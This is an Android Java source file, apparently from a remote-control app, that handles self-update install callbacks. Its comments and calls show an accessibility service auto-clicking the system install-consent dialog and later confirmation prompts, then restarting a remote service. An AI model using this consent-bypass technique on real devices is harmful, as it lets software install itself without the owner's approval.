package com.ohmpi.androremote;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageInstaller;
import android.os.Build;

import java.io.File;
import java.io.FileOutputStream;
import java.nio.charset.StandardCharsets;

/** PackageInstaller status receiver: drives the consent flow and survives self-update. */
public class UpdateReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context ctx, Intent intent) {
        int status = intent.getIntExtra(PackageInstaller.EXTRA_STATUS, PackageInstaller.STATUS_FAILURE);
        if (status == PackageInstaller.STATUS_PENDING_USER_ACTION) {
            // show the system installer; RemoteAccessibilityService auto-clicks it
            Intent confirm = intent.getParcelableExtra(Intent.EXTRA_INTENT);
            if (confirm != null) {
                confirm.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                try {
                    ctx.startActivity(confirm);
                } catch (Exception ignored) {}
            }
        } else if (status == PackageInstaller.STATUS_SUCCESS) {
            writeStatus(ctx, "success at " + new java.util.Date());
            RemoteAccessibilityService.armAutoConfirm(30_000); // "Open"/"Done" dialog if shown
            Intent i = new Intent(ctx, RemoteService.class);
            try {
                if (Build.VERSION.SDK_INT >= 26) ctx.startForegroundService(i);
                else ctx.startService(i);
            } catch (Exception ignored) {}
        } else {
            String msg = intent.getStringExtra(PackageInstaller.EXTRA_STATUS_MESSAGE);
            writeStatus(ctx, "failure: " + status + " " + msg);
        }
    }

    void writeStatus(Context ctx, String s) {
        try (FileOutputStream fos = new FileOutputStream(new File(ctx.getFilesDir(), "install_status.txt"))) {
            fos.write(s.getBytes(StandardCharsets.UTF_8));
        } catch (Exception ignored) {}
    }
}
